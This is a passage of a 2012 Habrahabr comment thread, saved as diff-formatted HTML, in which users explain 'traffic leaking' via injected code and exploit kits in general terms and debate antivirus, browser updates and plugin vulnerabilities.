+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Ikarr/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/5474_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/Ikarr/" class="username">Ikarr</a>
+			<time datetime="2012-01-25T21:25:19+04:00">25 января 2012, 21:25</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560799" class="link_to_comment">#</a>
+			
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Сначала прочитал без единичек адрес, думал, опять индийский колл-центр балуется :) 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4560799">
+	
+	</div>
+</div>
+
+   
+    
+<div class="comment_item" id="comment_4560838">
+	
+	
+		<div class="info  	" rel="4560838">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4560838" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 48: &uarr;46 и &darr;2">+44</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/int80h/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/46527_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/int80h/" class="username">int80h</a>
+			<time datetime="2012-01-25T21:38:32+04:00">25 января 2012, 21:38</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560838" class="link_to_comment">#</a>
+			
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Для далеких от веб — что такое «слив трафика»? 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4560838">
+	 
+		
+<div class="comment_item" id="comment_4560842">
+	
+	
+		<div class="info  	" rel="4560842">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4560842" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 8: &uarr;8 и &darr;0">+8</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Coderr/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/36599_24x24.png" alt=""></a>
+			<a href="http://habrahabr.ru/users/Coderr/" class="username">Coderr</a>
+			<time datetime="2012-01-25T21:40:49+04:00">25 января 2012, 21:40</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560842" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560838" data-id="4560842" data-parent_id="4560838" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Вставка кода, таким образом, что у посетителя подгружается еще один сайт, того кто сливает. В результате этот траффик можно использовать в разнообразных целях 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4560842">
+	 
+		
+<div class="comment_item" id="comment_4560858">
+	
+	
+		<div class="info  	" rel="4560858">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4560858" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 16: &uarr;16 и &darr;0">+16</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/tltshnik/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/tltshnik/" class="username">tltshnik</a>
+			<time datetime="2012-01-25T21:47:53+04:00">25 января 2012, 21:47</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560858" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560842" data-id="4560858" data-parent_id="4560842" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			То есть, я правильно понимаю, что кто-то таким образом поднимает себе количество посетителей сайта? Или «слив трафика» это что-то другое? <br>
+<br>
+Извините, я тоже далёк от веба, но новость заинтересовала. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4560858">
+	 
+		
+<div class="comment_item" id="comment_4560862">
+	
+	
+		<div class="info  	" rel="4560862">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4560862" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 11: &uarr;11 и &darr;0">+11</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/grobik/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/grobik/" class="username">grobik</a>
+			<time datetime="2012-01-25T21:50:18+04:00">25 января 2012, 21:50</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560862" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560858" data-id="4560862" data-parent_id="4560858" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			накрутка посетителей это самое безобидное, обычно троянов подсаживают 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4560862">
+	 
+		
+<div class="comment_item" id="comment_4560897">
+	
+	
+		<div class="info  	" rel="4560897">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4560897" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 23: &uarr;21 и &darr;2">+19</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Raz0r/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/25491_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/Raz0r/" class="username">Raz0r</a>
+			<time datetime="2012-01-25T22:01:09+04:00">25 января 2012, 22:01</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560897" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560862" data-id="4560897" data-parent_id="4560862" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			на подгружаемом хосте обычно находится так называемая «связка» — набор эксплоитов, которые используют уязвимости вашего браузера или плагинов к нему для выполнения произвольного кода и, как следствие, выполнения различной малвари: win-блокеров, ddos-ботов, формграбберов и т.д. Связка определяет версию браузера, доступен ли флэш, ява, etc, затем отдает подходящий эксплоит, на настоящее время самым актуальным эксплоитом является Java Rhino (CVE-2011-3544).<br>
+P.S. используйте Google Chrome 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4560897">
+	 
+		
+<div class="comment_item" id="comment_4561445">
+	
+	
+		<div class="info  	" rel="4561445">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4561445" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  negative">
+						<span class="score" title="Всего 58: &uarr;3 и &darr;55">–52</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Rigidus/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/40339_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/Rigidus/" class="username">Rigidus</a>
+			<time datetime="2012-01-26T08:48:52+04:00">26 января 2012, 08:48</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561445" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560897" data-id="4561445" data-parent_id="4560897" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message bad bad5" data-default_opacity="0.2" style="opacity: 0.2; ">
+			А у меня сайт на Common Lisp и MySql я не использую, но все равно пост порадовал — хорошо что у меня такого нет и не будет :) 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4561445">
+	 
+		
+<div class="comment_item" id="comment_4562065">
+	
+	
+		<div class="info  	" rel="4562065">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4562065" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 5: &uarr;3 и &darr;2">+1</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/stalker_by/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/34190_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/stalker_by/" class="username">stalker_by</a>
+			<time datetime="2012-01-26T14:20:14+04:00">26 января 2012, 14:20</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4562065" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561445" data-id="4562065" data-parent_id="4561445" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Радуйтесь дальше, все хорошо ) 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4562065">
+	
+	</div>
+</div>
+
+	 
+		
+<div class="comment_item" id="comment_4562305">
+	
+	
+		<div class="info  	" rel="4562305">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4562305" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 7: &uarr;6 и &darr;1">+5</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Chesnovich/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/stub-user-small.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/Chesnovich/" class="username">Chesnovich</a>
+			<time datetime="2012-01-26T15:19:38+04:00">26 января 2012, 15:19</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4562305" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4561445" data-id="4562305" data-parent_id="4561445" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Помойму роли нет на чём написан сайт, всё равно языком програмирования Вы генерируете и преподносите HTML-код конечному юзеру. А данный топик касается именно HTML, так что Вам боятся есть чего 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4562305">
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	 
+		
+<div class="comment_item" id="comment_4562025">
+	
+	
+		<div class="info  	" rel="4562025">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4562025" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 1: &uarr;1 и &darr;0">+1</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Mushtat/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/45220_24x24.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/Mushtat/" class="username">Mushtat</a>
+			<time datetime="2012-01-26T14:06:46+04:00">26 января 2012, 14:06</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4562025" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560897" data-id="4562025" data-parent_id="4560897" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Порадовал Касперский — не одна ссылка не открылась, всё блокировалось.<br>
+Но грустно то, что время от времени я попадаю на странички с ворнами от Касперского.<br>
+Чаще, чем раньше :( 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4562025">
+	 
+		
+<div class="comment_item" id="comment_4563118">
+	
+	
+		<div class="info  	" rel="4563118">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4563118" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 4: &uarr;4 и &darr;0">+4</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/achekalin/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/44641_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/achekalin/" class="username">achekalin</a>
+			<time datetime="2012-01-26T19:46:47+04:00">26 января 2012, 19:46</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4563118" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4562025" data-id="4563118" data-parent_id="4562025" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Моя уверенность в К. закончилась давно, в тот момент, когда явно вирусный файл он почему-то не отдетектил (знакомый скачал что-то подозрительное, проверил лицензионным К., запустил — и <i>попал</i>...)<br>
+<br>
+К. сам по себе не виноват: вирус можно написать так, что его ни один эвристический, не то что сигнатурный, детектор, не заметит, разве что всполошится какая-нибудь система анализа поведения в системе, если очень повезет. Зашита от фишинга тоже не исключение, она работает по спискам и оценкам, а это дело такое, не 100% надежное…<br>
+<br>
+Про знакомого этого — вроде как он «сам виноват, зачем подозрительный файл открыл», но через 1х1 фрейм можно незаметно подлить на машину очень даже много «добра».<br>
+<br>
+Вывод — <b>бекапиться</b>, <b>не верить в защиту</b>, <b>осторожничать</b>, <b>запрещать все, разрешать только нужное</b>. Которое, если не повезет, вполне будет пропущено системами защиты.<br>
+<br>
+Осталось себя только заставить жить именно так, и никак иначе! )) 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4563118">
+	 
+		
+<div class="comment_item" id="comment_4563425">
+	
+	
+		<div class="info  	" rel="4563425">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4563425" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Mushtat/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/45220_24x24.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/Mushtat/" class="username">Mushtat</a>
+			<time datetime="2012-01-26T22:34:17+04:00">26 января 2012, 22:34</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4563425" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4563118" data-id="4563425" data-parent_id="4563118" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Я согласен с Вами, и в целом Вы правы.<br>
+Да и рассуждать на эту тему можно много.<br>
+Из АВ решений Касперский не зря считается наилучшим.<br>
+Как бы там нибыло, главная защита — голова. И каспер, и система предупредят в большинстве случаев пользователя. Если конечно пользователь не сидит под админкой в системе.<br>
+Как говорил Кевин Митник, безопасность слишком часто просто иллюзия и иногда иллюзия может быть хуже легковерия, наивности или невежества. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4563425">
+	 
+		
+<div class="comment_item" id="comment_4563472">
+	
+	
+		<div class="info  	" rel="4563472">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4563472" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/achekalin/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/44641_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/achekalin/" class="username">achekalin</a>
+			<time datetime="2012-01-26T22:51:07+04:00">26 января 2012, 22:51</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4563472" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4563425" data-id="4563472" data-parent_id="4563425" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Я всегда себе напоминаю фразу — «я плачу в интернет-магазинах кредиткой не потому, что верю интернет-магазину, а потому, что, случись кому-то украсть номер моей карты и купить что-то, я опротестую эти покупки, и ничего не потеряю».<br>
+<br>
+Когда же риск потери (данных, работы, времени) не прикрыт кем-то сторонним, остается все время проверять и ничему не доверить. И хорош ли К, или нет — дело-то десятое, пусть он отбивает (условно) 990 из 1000 атак, против 950 из 1000 у конкурентов, с остатком (10 или 50) останется иметь дело мне самому… <br>
+<br>
+У меня у знакомого украли пароль от ftp-доступа к его сайту. Точнее, просто подобрали, т.к. вирусни на машине не нашлось. Так он узнал об этом, только когда Гугл его сайт в опасные занес — вот что обидно. К, кстати, и в его случае был куплен, и работал… 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4563472">
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	 
+		
+<div class="comment_item" id="comment_4562228">
+	
+	
+		<div class="info  	" rel="4562228">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4562228" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 6: &uarr;5 и &darr;1">+4</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/DnV/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/25997_24x24.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/DnV/" class="username">DnV</a>
+			<time datetime="2012-01-26T15:00:13+04:00">26 января 2012, 15:00</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4562228" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4560897" data-id="4562228" data-parent_id="4560897" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			&gt;используйте Google Chrome <br>
+Вы же хотели сказать «любой современный браузер с автоматическим обновлением», правильно? 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4562228">
+	 
+		
+<div class="comment_item" id="comment_4563021">
+	
+	
+		<div class="info  	" rel="4563021">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4563021" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 1: &uarr;1 и &darr;0">+1</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Inflame/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/41980_24x24.png" alt=""></a>
+			<a href="http://habrahabr.ru/users/Inflame/" class="username">Inflame</a>
+			<time datetime="2012-01-26T19:09:59+04:00">26 января 2012, 19:09</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4563021" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4562228" data-id="4563021" data-parent_id="4562228" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			От 0day эксплоитов автоматическое обновление не спасёт. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4563021">
+	 
+		
+<div class="comment_item" id="comment_4563211">
+	
+	
+		<div class="info  	" rel="4563211">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4563211" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark positive ">
+						<span class="score" title="Всего 7: &uarr;6 и &darr;1">+5</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/mammuthus/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/46963_24x24.png" alt=""></a>
+			<a href="http://habrahabr.ru/users/mammuthus/" class="username">mammuthus</a>
+			<time datetime="2012-01-26T20:38:47+04:00">26 января 2012, 20:38</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4563211" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4563021" data-id="4563211" data-parent_id="4563021" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Как, собственно, и использование Google Chrome. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4563211">
+	
+	</div>
+</div>
+
+	 
+		
+<div class="comment_item" id="comment_4563314">
+	
+	
+		<div class="info  	" rel="4563314">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4563314" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Lux_In_Tenebris/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/850_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/Lux_In_Tenebris/" class="username">Lux_In_Tenebris</a>
+			<time datetime="2012-01-26T21:37:47+04:00">26 января 2012, 21:37</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4563314" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4563021" data-id="4563314" data-parent_id="4563021" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Весьма значительная доля «браузерных» эксплойтов нынче разрабатывается не под сами браузеры, а всевозможные плагины: Flash проигрыватель, Java RE, Adobe Reader, Windows Media Player.<br>
+Браузеры то уже худо-бедно научились регулярно патчить и автообновлять, а с остальным пока не так радужно. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4563314">
+	
+	</div>
+</div>
+
+	
+	</div>
+</div>
+
+	 
+		
+<div class="comment_item" id="comment_4568860">
+	
+	
+		<div class="info  	" rel="4568860">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4568860" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Raz0r/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/25491_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/Raz0r/" class="username">Raz0r</a>
+			<time datetime="2012-01-29T15:34:40+04:00">29 января 2012, 15:34</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4568860" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4562228" data-id="4568860" data-parent_id="4562228" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			не только это, в сравнении с остальными браузерами Chrome — самый защищенный. Взгляните на статистику, взятой с реальной связки:<br>
+Opera — 15,91%<br>
+IE — 15,51%<br>
+Firefox — 13,97%<br>
+Chrome — 0,46%<br>
+<a href="http://1.bp.blogspot.com/-7V22h6JuKgg/TuJrMPh2TWI/AAAAAAAAD1c/kazMGH2LBt8/s1600/stats.png">1.bp.blogspot.com/-7V22h6JuKgg/TuJrMPh2TWI/AAAAAAAAD1c/kazMGH2LBt8/s1600/stats.png</a> 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4568860">
+	 
+		
+<div class="comment_item" id="comment_4570451">
+	
+	
+		<div class="info  	" rel="4570451">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4570451" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/DnV/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/25997_24x24.gif" alt=""></a>
+			<a href="http://habrahabr.ru/users/DnV/" class="username">DnV</a>
+			<time datetime="2012-01-30T11:19:25+04:00">30 января 2012, 11:19</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4570451" class="link_to_comment">#</a>
+			
+			
+				<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4568860" data-id="4570451" data-parent_id="4568860" class="to_parent">↑</a>
+			
+			<span class="to_chidren"></span>
+			<div class="clear"></div>
+		</div>
+		<div class="message ">
+			Это проценты от чего? Какие версии браузеров?<br>
+Хром с самого начала обновляется в фоне без участия пользователя. Новый ФФ тоже так умеет, но число людей, сидящих на старых версиях всё ещё велико. 
+		</div>
+		<div class="reply">
+			
+		</div>
+	
+	<div class="reply_comments" id="reply_comments_4570451">
+	 
+		
+<div class="comment_item" id="comment_4570693">
+	
+	
+		<div class="info  	" rel="4570693">
+			<div class="folding-dot-holder"><div class="folding-dot"></div></div>
+			
+			<div id="voting_4570693" class="voting   ">
+										
+				
+					<span class="plus" title="Голосовать могут только зарегистрированные пользователи."></span>
+					<span class="minus" title="Голосовать могут только зарегистрированные пользователи."></span>
+				
+				<div class="mark  ">
+						<span class="score" title="Всего 0: &uarr;0 и &darr;0">0</span> 
+				</div>	 
+			</div>
+			
+			<a href="http://habrahabr.ru/users/Raz0r/" class="avatar"><img src="./Как я узнал, что у нас сливают трафик   Информационная безопасность   Хабрахабр_files/25491_24x24.jpg" alt=""></a>
+			<a href="http://habrahabr.ru/users/Raz0r/" class="username">Raz0r</a>
+			<time datetime="2012-01-30T12:56:49+04:00">30 января 2012, 12:56</time>
+			<a href="http://habrahabr.ru/blogs/infosecurity/136771/#comment_4570693" class="link_to_comment">#</a>
+			
+			
